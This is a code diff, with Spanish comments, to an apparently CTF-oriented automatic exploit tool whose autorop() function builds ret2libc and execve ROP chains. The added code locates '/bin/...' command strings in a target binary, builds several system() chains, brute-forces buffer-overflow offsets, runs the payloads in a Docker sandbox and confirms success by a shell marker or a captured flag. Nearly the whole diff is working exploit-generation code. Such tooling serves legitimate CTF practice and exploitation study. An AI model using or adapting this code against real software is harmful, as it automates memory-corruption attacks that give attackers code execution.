@@ -451,6 +451,50 @@ def _docker_run_raw(binary: str, data: bytes):
             pass
 
 
+# Gap real encontrado probando autorop() contra el ret2libc REAL de ROP Emporium (split, no
+# un fixture sintetico de este proyecto): su string ya-presente no es "/bin/sh" sino
+# "/bin/cat flag.txt" -- el patron real mas comun para ensenar ret2libc sin que el atacante
+# tenga que aportar/escalonar su propio string. binsh = next(elf.search(b"/bin/sh\x00"), ...)
+# nunca encontraba nada ahi, asi que NINGUNA estrategia (ni la 1, ni la 2/4 que dependen de
+# `binsh`) llegaba a construirse -- "no se pudo construir cadena automatica" para un binario
+# con system() en el PLT y un string de comando ya listo en .data.
+def _find_shell_cmd_strings(elf) -> list:
+    """Candidatas /bin/...\\x00 ya presentes en el binario para pasar a system() -- su DIRECCION
+    EXISTENTE, no un bytes nuevo (pasar bytes a rop.call() hace que pwntools ESCALONE una copia
+    nueva al final del payload, cuya direccion de pila solo es correcta si rop.address refleja
+    donde aterriza de verdad el overflow -- justo lo que NO sabemos aqui; usar la direccion ya
+    existente evita esa fragilidad por completo, igual que el '/bin/sh' original). Ordenadas por
+    prioridad: /bin/sh exacto primero (comportamiento ya existente, intacto), luego cualquier
+    otro /bin/... que mencione 'cat'/'flag' (el patron real mas comun -- confirmado en vivo
+    contra split: "/bin/cat flag.txt\\x00"), luego el resto (p.ej. un '/bin/ls' senuelo que el
+    mismo binario tambien referencia en otro sitio). Devuelve pares (direccion, bytes)."""
+    try:
+        with open(elf.path, "rb") as f:
+            data = f.read()
+    except Exception:
+        data = b""
+    seen, cands = set(), []
+    for m in re.finditer(rb"/bin/[ -~]{1,80}\x00", data):
+        s = m.group(0)
+        if s in seen:
+            continue
+        addr = next(elf.search(s), None)
+        if addr is None:
+            continue
+        seen.add(s)
+        cands.append((addr, s))
+
+    def _prio(pair):
+        s = pair[1]
+        if s == b"/bin/sh\x00":
+            return 0
+        if b"cat" in s or b"flag" in s:
+            return 1
+        return 2
+    cands.sort(key=_prio)
+    return cands
+
+
 def autorop(binary: str, offset=None, run: bool = True) -> dict:
     """Build a ROP execve('/bin/sh') / ret2libc chain and, if runnable, VERIFY it spawns a
     shell in the sandbox by having that shell echo a marker. Works out of the box for static
@@ -472,20 +516,41 @@ def autorop(binary: str, offset=None, run: bool = True) -> dict:
     rop = ROP(elf)
     built = False
     strategy = ""
-    if binsh is not None:
-        # 1) ret2libc system('/bin/sh') if system is available (dynamic or static-with-system).
+    chain_variants: list = []   # [(label, chain_bytes), ...] -- mas de una cuando hay varios
+    # strings /bin/... candidatos (p.ej. un '/bin/ls' senuelo junto al real '/bin/cat flag.txt');
+    # el bucle de ejecucion mas abajo prueba TODOS, no solo el primero que compile.
+    shell_cmds = _find_shell_cmd_strings(elf)
+    if shell_cmds:
+        # 1) ret2libc system(<cmd>) if system is available (dynamic or static-with-system).
         #    ARCH-AGNOSTICO: rop.call() coloca el arg en el registro (x64) o en la pila (x86-32 cdecl)
-        #    segun el contexto del ELF. Verificado en sandbox con ret2win32 (x86-32): shell real.
+        #    segun el contexto del ELF. Verificado en sandbox con ret2win32 (x86-32) Y con el
+        #    ret2libc real de ROP Emporium's split (string "/bin/cat flag.txt", no "/bin/sh").
         try:
             sysaddr = elf.plt.get("system") or (elf.symbols or {}).get("system")
             if sysaddr:
-                try:
-                    rop.raw(rop.find_gadget(["ret"]).address)
-                except Exception:
-                    pass
-                rop.call(sysaddr, [binsh]); built = True; strategy = "ret2libc system"
+                for cmd_addr, cmd_bytes in shell_cmds:
+                    try:
+                        _r = ROP(elf)
+                        try:
+                            _r.raw(_r.find_gadget(["ret"]).address)
+                        except Exception:
+                            pass
+                        _r.call(sysaddr, [cmd_addr])
+                        _label = "ret2libc system(%r)" % cmd_bytes.rstrip(b"\x00").decode("latin1")
+                        chain_variants.append((_label, _r.chain()))
+                    except Exception:
+                        continue
+                if chain_variants:
+                    rop = ROP(elf)
+                    try:
+                        rop.raw(rop.find_gadget(["ret"]).address)
+                    except Exception:
+                        pass
+                    rop.call(sysaddr, [shell_cmds[0][0]])
+                    built = True; strategy = chain_variants[0][0]
         except Exception:
             pass
+    if binsh is not None:
         # 2) explicit execve syscall chain. ARCH-AWARE: en x86-32 es eax=11/ebx/ecx/edx + `int 0x80`;
         #    en x86-64 es rax=0x3b/rdi/rsi/rdx + `syscall`. Antes esta rama fijaba SIEMPRE rax/rdi
         #    (64-bit) con execve=0x3b aunque el binario fuese de 32 bits -> cadena incorrecta.
@@ -574,6 +639,8 @@ def autorop(binary: str, offset=None, run: bool = True) -> dict:
         # p.ej. falta un 'pop rdi' para colocar el argumento: la cadena es insatisfactible.
         return {"ok": False, "note": f"no se pudo resolver la cadena ROP (gadget faltante: {e}). "
                 "Prueba ret2win (autopoc) o ret2libc con leak (autolibc)."}
+    if not chain_variants:
+        chain_variants = [(strategy, chain)]
     marker = "BINORACLE_PWNED"
     res = {"ok": True, "verified": False, "offset": offset, "strategy": strategy,
            "chain": rop.dump()}
@@ -589,20 +656,30 @@ def autorop(binary: str, offset=None, run: bool = True) -> dict:
         else:
             candidates = _offset_candidates(binary, None)
             candidates += [c for c in _brute if c not in candidates]
-        for cand in candidates:
-            if cand is None:
-                continue
-            data = (b"A" * cand + chain).ljust(1024, b"A") + b"\n echo " + marker.encode() + b"\n"
-            ran, out = _docker_run_raw(binary, data)
-            if ran and marker in out:
-                res["verified"] = True
-                res["offset"] = cand
-                res["payload_hex"] = (b"A" * cand + chain).hex()
+        # misma brecha real ya encontrada y cerrada esta noche (autopoc._check_success,
+        # autocsu.py): muchos retos reales (system("/bin/cat flag.txt") incluido, toda la serie
+        # de ROP Emporium) no abren shell -- system() corre UNA vez y el programa sigue/sale, asi
+        # que el "echo MARK" que se manda a continuacion por el MISMO pipe de stdin nunca lo
+        # ejecuta nadie. Se busca TAMBIEN un patron de flag CTF en la salida, no solo el marcador.
+        for variant_label, variant_chain in chain_variants:
+            for cand in candidates:
+                if cand is None:
+                    continue
+                data = (b"A" * cand + variant_chain).ljust(1024, b"A") + b"\n echo " + marker.encode() + b"\n"
+                ran, out = _docker_run_raw(binary, data)
+                fm = re.search(r"[A-Za-z0-9_]+\{[^}\n]{1,80}\}", out or "") if ran else None
+                if ran and (marker in out or fm):
+                    res["verified"] = True
+                    res["offset"] = cand
+                    res["strategy"] = variant_label
+                    res["payload_hex"] = (b"A" * cand + variant_chain).hex()
+                    res["run_output"] = out
+                    if fm:
+                        res["flag"] = fm.group(0)
+                    if offset is None:
+                        res["note"] = f"offset {cand} hallado por busqueda dinamica"
+                    return res
                 res["run_output"] = out
-                if offset is None:
-                    res["note"] = f"offset {cand} hallado por busqueda dinamica"
-                return res
-            res["run_output"] = out
         if offset is None:
             res["note"] = "cadena construida; no se verifico shell (offset no hallado)"
     elif offset is None:
